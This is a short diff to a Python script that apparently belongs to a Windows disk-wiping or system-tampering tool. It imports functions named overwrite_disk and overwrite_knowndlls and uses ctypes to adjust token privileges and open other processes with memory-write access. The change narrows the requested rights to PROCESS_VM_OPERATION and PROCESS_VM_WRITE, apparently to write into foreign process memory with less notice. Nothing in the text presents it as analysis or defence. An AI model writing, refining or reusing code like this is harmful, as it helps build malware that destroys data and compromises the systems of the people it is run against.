@@ -1,25 +1,26 @@
 import os
 import json
-import random
-import string
 import ctypes
-import zipfile
-import argparse
 from ctypes import wintypes
+import argparse
 from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning)
+import random
+import string
+import zipfile
 
 
 # Constants
-PROCESS_ALL_ACCESS = 0x1F0FFF
+TOKEN_ADJUST_PRIVILEGES = 0x0020
+TOKEN_QUERY = 0x0008
+SE_PRIVILEGE_ENABLED = 0x00000002
+PROCESS_VM_OPERATION = 0x8
+PROCESS_VM_WRITE = 0x20
 MemoryBasicInformation = 0
 ProcessBasicInformation = 0 
 PAGE_NOACCESS = 0x01
 MEM_COMMIT = 0x00001000
-TOKEN_ADJUST_PRIVILEGES = 0x0020
-TOKEN_QUERY = 0x0008
-SE_PRIVILEGE_ENABLED = 0x00000002
 
 
 # Structures
@@ -133,7 +134,7 @@ def open_process(pid):
     )
     status = NtOpenProcess(
         ctypes.byref(process_handle),
-        PROCESS_ALL_ACCESS,
+        (PROCESS_VM_OPERATION | PROCESS_VM_WRITE),
         ctypes.byref(obj_attributes),
         ctypes.byref(client_id)
     )
